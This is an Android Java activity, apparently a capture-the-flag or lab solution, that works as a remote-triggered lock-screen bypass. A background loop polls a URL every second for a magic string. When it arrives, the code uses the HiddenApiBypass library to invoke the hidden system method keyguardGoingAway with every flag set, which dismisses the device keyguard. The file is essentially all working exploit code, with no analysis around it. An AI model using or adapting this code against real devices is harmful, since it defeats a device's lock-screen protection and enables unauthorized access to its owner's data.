package com.example.mirror_mirror_solve_with_control;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Context;
import android.os.Bundle;
import org.lsposed.hiddenapibypass.HiddenApiBypass;
import android.util.Log;
import android.app.ActivityManager;

import java.util.Objects;
import java.util.concurrent.ExecutionException;


public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Thread t1 = new Thread(new Runnable() {
            @Override
            public void run() {
                do {
                    WebPageFetcher fetcher = new WebPageFetcher();
                    fetcher.execute("https://127.0.0.1/check");
                    String content = null; // This will block until the AsyncTask completes
                    try {
                        content = fetcher.get();
                    } catch (ExecutionException | InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                    // Check if remote content comports the magic string, to unlock the screen
                    if (Objects.equals(content, "4585249675")) {
                        Log.d(TAG, "Received unlock command from remote server.");
                        unlockScreen();
                    }
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                }
                while (true);
            }
        });
        t1.start();
    }

    private void unlockScreen() {
        try {
            Log.d("Status", "Trying to unlock...");
            // Get the system service from the current activity
            ActivityManager activityService = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            // Get the service task from the IActivityTaskManager object
            var IActivityTaskManager_StubProxy = HiddenApiBypass.invoke(activityService.getClass(), activityService, "getTaskService");
            // Check if method exists, from ActivityTaskManagerService class type
            HiddenApiBypass.getDeclaredMethod(IActivityTaskManager_StubProxy.getClass(), "keyguardGoingAway", Integer.TYPE);
            // Remove keyguard, "31" sets every flag
            HiddenApiBypass.invoke(IActivityTaskManager_StubProxy.getClass(), IActivityTaskManager_StubProxy, "keyguardGoingAway", 31);
            Log.d("Status", "Device should be unlocked !");
        } catch (Exception e) {
            // Class not found exception
            Log.e(TAG, "Unlocking failed :");
            e.printStackTrace();
        }
    }
}

